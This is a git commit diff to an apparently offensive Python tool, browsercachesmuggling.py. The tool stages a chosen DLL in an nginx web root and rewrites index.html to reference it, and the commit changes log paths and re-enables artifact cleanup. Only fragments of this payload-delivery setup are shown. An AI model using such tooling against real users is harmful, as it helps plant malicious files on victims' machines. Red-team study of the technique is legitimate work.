f1384230f31cc8ab9a5784d859c98712f4516aa2
surya-dev-singh <suryadevsingh521@gmail.com>
2023-10-25 10:26:55 -0400

    modified code

--- browsercachesmuggling.py
+++ browsercachesmuggling.py
@@ -20,7 +20,7 @@ def start_nginx_service_safely():
 
     try:
         # Run the command using subprocess & create Acess log file
-        subprocess.run(["touch","./webserver/tmp/access.log"], check=True)
+        subprocess.run(["touch","/tmp/access.log"], check=True)
         subprocess.run(["service", "nginx", "start"], check=True)
         cprint("[+] Nginx service started successfully.","green")
     except subprocess.CalledProcessError as e:
@@ -50,7 +50,7 @@ def modify_Serverfile(file_path,replacement_dll):
 def deployment(dll_path):
     # updating webroot directory
     dll_file_name=os.path.basename(dll_path)
-    #clean_up(dll_file_name)
+    clean_up(dll_file_name)
     shutil.copy(dll_path,"/var/www/html")
     modify_Serverfile("./webserver/index.html",dll_file_name)
     os.rename("/var/www/html/index.html","/var/www/html/index.html.bak")
@@ -65,7 +65,7 @@ def deployment(dll_path):
         while True:
             cprint("[+] Serving the logs....","green")
             cprint("[*] Press CTRL+C to stop the server")
-            subprocess.run(["tail","-n","1","-f","./webserver/tmp/access.log"],check=True)
+            subprocess.run(["tail","-f","/tmp/access.log"],check=True)
     except KeyboardInterrupt:
             cprint("[+] CTRL+c Detected, Stopping nginx service ....","yellow")
             subprocess.run(["service", "nginx", "stop"], check=True)
@@ -78,7 +78,7 @@ def deployment(dll_path):
 def clean_up(dll_file_name):
     try:
         os.remove(f"/var/www/html/{dll_file_name}")
-        os.remove(f"./webserver//tmp/access.log")
+        os.remove(f"/tmp/access.log")
         if os.path.exists("/etc/nginx/sites-available/default.bak"):
             #clean up of nginx config files
             cprint("[+] Cleaning up the artifacts...","green",end="")
